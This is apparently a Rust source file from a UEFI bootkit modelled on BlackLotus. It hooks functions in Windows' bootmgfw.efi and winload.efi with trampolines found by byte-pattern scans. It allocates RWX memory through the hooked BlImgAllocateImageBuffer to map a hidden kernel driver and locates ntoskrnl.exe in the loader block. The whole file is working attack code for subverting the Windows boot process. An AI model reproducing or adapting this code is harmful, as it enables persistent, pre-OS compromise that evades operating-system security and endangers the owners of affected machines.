use core::ffi::c_void;
use core::{slice::from_raw_parts};
use uefi::{prelude::BootServices};
use uefi::proto::loaded_image::LoadedImage;
use uefi::{Handle, Status};
use crate::boot::globals::{DRIVER_ADDRESS, DRIVER_LENGTH};
use crate::boot::pe::{pattern_scan, trampoline_hook64, trampoline_unhook, get_loaded_module_by_hash};
use super::{includes::_LOADER_PARAMETER_BLOCK};

extern crate alloc;

#[allow(non_camel_case_types)]
type ImgArchStartBootApplicationType = fn(app_entry: *mut u8, image_base: *mut u8, image_size: u32, boot_option: u8, return_arguments: *mut u8);

#[allow(non_upper_case_globals)]
static mut ImgArchStartBootApplication: Option<ImgArchStartBootApplicationType> = None;

#[allow(non_camel_case_types)]
type BlImgAllocateImageBufferType = fn(image_buffer: &mut *mut c_void, image_size: usize, memory_type: u32, attributes: u32, unused: *mut c_void, flags: u32) -> uefi::Status;

#[allow(non_upper_case_globals)]
static mut BlImgAllocateImageBuffer: Option<BlImgAllocateImageBufferType> = None;

const BL_MEMORY_ATTRIBUTE_RWX: u32 = 0x424000;
const BL_MEMORY_TYPE_APPLICATION: u32 = 0xE0000012;

#[allow(non_camel_case_types)]
type OslArchTransferToKernelType = fn(loader_block: *mut _LOADER_PARAMETER_BLOCK, entry: *mut u8);

#[allow(non_upper_case_globals)]
static mut OslArchTransferToKernel: Option<OslArchTransferToKernelType> = None;

#[allow(non_camel_case_types)]
type OslFwpKernelSetupPhase1Type = fn(loader_block: *mut _LOADER_PARAMETER_BLOCK);

#[allow(non_upper_case_globals)]
static mut OslFwpKernelSetupPhase1: Option<OslFwpKernelSetupPhase1Type> = None;

const JMP_SIZE: usize = 14;
static mut ORIGINAL_BYTES: [u8; JMP_SIZE] = [0; JMP_SIZE];
static mut ORIGINAL_BYTES_COPY: [u8; JMP_SIZE] = [0; JMP_SIZE];

pub fn setup_hooks(bootmgfw_handle: &Handle, boot_services: &BootServices) -> uefi::Result<> {
    // Open a handle to the loaded image bootmgfw.efi
    let bootmgr = boot_services.open_protocol_exclusive::<LoadedImage>(*bootmgfw_handle)?;

    // Returns the base address and the size in bytes of the loaded image.
    let (image_base, image_size) = bootmgr.info();

    // Read Windows Boot Manager (bootmgfw.efi) from memory and store in a slice
    let bootmgfw_data = unsafe { from_raw_parts(image_base as *mut u8, image_size as usize) };

    // Look for the ImgArchStartBootApplication signature in Windows EFI Boot Manager (bootmgfw.efi) and return an offset
    let offset = pattern_scan(bootmgfw_data, "48 8B C4 48 89 58 ? 44 89 40 ? 48 89 50 ? 48 89 48 ? 55 56 57 41 54")
        .expect("Failed to pattern scan for ImgArchStartBootApplication")
        .expect("Failed to find ImgArchStartBootApplication pattern"
    );

    // Print the bootmgfw.efi image base and of ImgArchStartBootApplication offset and image base
    log::info!("bootmgfw.efi: {:#x}", image_base as usize);
    log::info!("ImgArchStartBootApplication offset: {:#x}", offset);
    log::info!("bootmgfw.efi + ImgArchStartBootApplication offset = {:#x}", (image_base as usize + offset));

    // Save the address of ImgArchStartBootApplication
    unsafe { ImgArchStartBootApplication = Some(core::mem::transmute::<_, ImgArchStartBootApplicationType>((image_base as usize + offset) as *mut u8)) }

    // Trampoline hook ImgArchStartBootApplication and save stolen bytes
    unsafe { 
        ORIGINAL_BYTES = trampoline_hook64(ImgArchStartBootApplication.unwrap() as *mut () as *mut u8, img_arch_start_boot_application_hook as *mut () as *mut u8,JMP_SIZE)
            .expect("Failed to hook on ImgArchStartBootApplication");
    }

    Ok(())
}

/// ImgArchStartBootApplication in bootmgfw.efi: hooked to catch the moment when the Windows OS loader (winload.efi) 
/// is loaded in the memory but still hasn't been executed to perform more in-memory patching.
/// https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/
pub fn img_arch_start_boot_application_hook(_app_entry: *mut u8, image_base: *mut u8, image_size: u32, _boot_option: u8, _return_arguments: *mut u8) {
    
    // Unhook ImgArchStartBootApplication and restore stolen bytes before we do anything else
    unsafe { trampoline_unhook(ImgArchStartBootApplication.unwrap() as *mut () as *mut u8,ORIGINAL_BYTES.as_mut_ptr(), JMP_SIZE) };

    log::info!("[+] ImgArchStartBootApplication Hook called!");

    // Read the data Windows OS Loader (winload.efi) from memory and store in a slice
    let winload_data = unsafe { from_raw_parts(image_base as *mut u8, image_size as usize) };

    // Look for the OslFwpKernelSetupPhase1 signature in Windows OS Loader (winload.efi) and return an offset
    let offset = pattern_scan(winload_data,"48 89 4C 24 ? 55 53 56 57 41 54 41 55 41 56 41 57 48 8D 6C 24 E1 48 81 EC ? ? ? ? 48 8B F1")
        .expect("Failed to pattern scan for OslFwpKernelSetupPhase1")
        .expect("Failed to find OslFwpKernelSetupPhase1 pattern");

    // Print the winload.efi image base and OslFwpKernelSetupPhase1 offset and image base
    log::info!("winload.efi: {:#x}", image_base as usize);
    log::info!("OslFwpKernelSetupPhase1 offset: {:#x}", offset);
    log::info!("winload.efi + OslFwpKernelSetupPhase1 offset = {:#x}", (image_base as usize + offset));

    // Save the address of OslFwpKernelSetupPhase1
    unsafe { OslFwpKernelSetupPhase1 = Some(core::mem::transmute::<_, OslFwpKernelSetupPhase1Type>((image_base as usize + offset) as *mut u8)) }

    // Trampoline hook OslFwpKernelSetupPhase1 and save stolen bytes
    unsafe { 
        ORIGINAL_BYTES = trampoline_hook64(OslFwpKernelSetupPhase1.unwrap() as *mut () as *mut u8,ols_fwp_kernel_setup_phase1_hook as *mut () as *mut u8, JMP_SIZE)
            .expect("Failed to perform trampoline hook on OslFwpKernelSetupPhase1");
    }

    //
    // Hook BlImgAllocateImageBuffer as well for allocating memory for the Windows kernel driver
    //

    // Look for the BlImgAllocateImageBuffer signature in Windows OS Loader (winload.efi) and return an offset
    let offset = pattern_scan(winload_data,"48 89 5C 24 ? 48 89 74 24 ? 48 89 7C 24 ? 55 41 54 41 55 41 56 41 57 48 8B EC 48 83 EC ? 48 8B 31")
        .expect("Failed to pattern scan for BlImgAllocateImageBuffer")
        .expect("Failed to find BlImgAllocateImageBuffer pattern");

    // Save the address of BlImgAllocateImageBuffer
    unsafe { BlImgAllocateImageBuffer = Some(core::mem::transmute::<_, BlImgAllocateImageBufferType>((image_base as usize + offset) as *mut u8)) }

    // Trampoline hook BlImgAllocateImageBuffer and save stolen bytes
    unsafe { 
        ORIGINAL_BYTES_COPY = trampoline_hook64(BlImgAllocateImageBuffer.unwrap() as *mut () as *mut u8,bl_img_allocate_image_buffer_hook as *mut () as *mut u8, JMP_SIZE)
            .expect("Failed to perform trampoline hook on BlImgAllocateImageBuffer");
    }

    log::info!("Calling Original ImgArchStartBootApplication");

    // Call the original unhooked ImgArchStartBootApplication function
    unsafe { ImgArchStartBootApplication.unwrap()(_app_entry, image_base, image_size, _boot_option, _return_arguments) };
}

/// This is called by the Windows OS loader (winload.efi) to allocate image buffers and we can use it to allocate memory for the Windows kernel driver
fn bl_img_allocate_image_buffer_hook(image_buffer: &mut *mut c_void, image_size: usize, memory_type: u32, attributes: u32, unused: *mut c_void, flags: u32) -> uefi::Status {
    // Unhook BlImgAllocateImageBuffer and restore stolen bytes before we do anything else
    unsafe { trampoline_unhook(BlImgAllocateImageBuffer.unwrap() as *mut () as *mut u8,ORIGINAL_BYTES_COPY.as_mut_ptr(),JMP_SIZE) };

    log::info!("[+] BlImgAllocateImageBuffer Hook called!");

    // Call the original unhooked BlImgAllocateImageBuffer function
    let status = unsafe { BlImgAllocateImageBuffer.unwrap()(image_buffer, image_size, memory_type, attributes, unused, flags) };
    log::info!("First BlImgAllocateImageBuffer returned: {:?}!", status);
    log::info!("Windows kernel driver loaded at: {:p}", image_buffer);

    if status == Status::SUCCESS && memory_type == BL_MEMORY_TYPE_APPLICATION {
        // Allocate memory for the driver
        let status = unsafe { BlImgAllocateImageBuffer.unwrap()(&mut (&mut DRIVER_ADDRESS as *mut u64 as *mut c_void), DRIVER_LENGTH as _, memory_type, BL_MEMORY_ATTRIBUTE_RWX, unused, 0) };
        
        log::info!("Second BlImgAllocateImageBuffer returned: {:?}!", status);
        log::info!("Driver Address: {:#x}", unsafe { DRIVER_ADDRESS as u64 });
        log::info!("Driver Length: {:#x}", unsafe { DRIVER_LENGTH as u64 });

        // This time we don't hook BlImgAllocateImageBuffer again
        return status;
    }

    // Trampoline hook BlImgAllocateImageBuffer and save stolen bytes again
    unsafe {
        ORIGINAL_BYTES_COPY = trampoline_hook64(BlImgAllocateImageBuffer.unwrap() as *mut () as *mut u8,bl_img_allocate_image_buffer_hook as *mut () as *mut u8, JMP_SIZE)
            .expect("Failed to perform trampoline hook on BlImgAllocateImageBuffer");
    }

    return status;
}

/// This is called by the Windows OS loader (winload.efi) with _LOADER_PARAMETER_BLOCK before calling ExitBootService (winload.efi context)
fn ols_fwp_kernel_setup_phase1_hook(loader_block: *mut _LOADER_PARAMETER_BLOCK) {
    // Unhook OslFwpKernelSetupPhase1 and restore stolen bytes before we do anything else
    unsafe { trampoline_unhook(OslFwpKernelSetupPhase1.unwrap() as *mut () as *mut u8,ORIGINAL_BYTES.as_mut_ptr(),JMP_SIZE) };

    log::info!("[+] OslFwpKernelSetupPhase1 Hook called!");

    // ntoskrnl.exe hash: 0xa3ad0390
    // Get ntoskrnl.exe _LIST_ENTRY from the _LOADER_PARAMETER_BLOCK to get image base and image size 
    let ntoskrnl_entry = unsafe { get_loaded_module_by_hash(&mut (*loader_block).LoadOrderListHead,0xa3ad0390)
        .expect("Failed to get loaded module by name")
    };

    log::info!("ntoskrnl.exe image base: {:p}", unsafe { (*ntoskrnl_entry).DllBase });
    log::info!("ntoskrnl.exe image size: {:#x}", unsafe { (*ntoskrnl_entry).SizeOfImage });
    
    
    /* The commented code is not required, if you're hooking OslFwpKernelSetupPhase1
    
    // Look for the OslArchTransferToKernel signature in Windows OS Loader (winload.efi) and return an offset
    let offset = pattern_scan(winload_data, "33 F6 4C 8B E1").expect("Failed to pattern scan for OslArchTransferToKernel").expect("Failed to find OslArchTransferToKernel pattern");
    
    // Save the address of OslArchTransferToKernel
    unsafe { OslArchTransferToKernel = Some(core::mem::transmute::<_, OslArchTransferToKernelType>((image_base as usize + offset) as *mut u8)) }

    // Trampoline hook OslArchTransferToKernel and save stolen bytes
    unsafe { ORIGINAL_BYTES = trampoline_hook64(OslArchTransferToKernel.unwrap() as *mut () as *mut u8, osl_arch_transfer_to_kernel_hook as *mut () as *mut u8, JMP_SIZE).expect("Failed to perform trampoline hook on OslArchTransferToKernel") };
    */

    // Call the original unhooked OslFwpKernelSetupPhase1 function
    unsafe { OslFwpKernelSetupPhase1.unwrap()(loader_block) };
    
}


#[allow(dead_code)]
// This function is not required anymore as OslArchTransferToKernel calls it after ExitBootServices, but is here for reference
/// OslArchTransferToKernel in winload.efi: Hooked to catch the moment when the OS kernel and some of the system drivers are 
/// already loaded in the memory, but still haven’t been executed to perform more in-memory patching
/// https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/
fn osl_arch_transfer_to_kernel_hook(loader_block: *mut _LOADER_PARAMETER_BLOCK, entry: *mut u8) {
    
    // Unhook OslArchTransferToKernel and restore stolen bytes before we do anything else
    unsafe { trampoline_unhook(
        OslArchTransferToKernel.unwrap() as *mut () as *mut u8,
        ORIGINAL_BYTES.as_mut_ptr(),
        JMP_SIZE
        )
    };

    // Call the original unhooked OslArchTransferToKernel function
    unsafe { OslArchTransferToKernel.unwrap()(loader_block, entry) };
}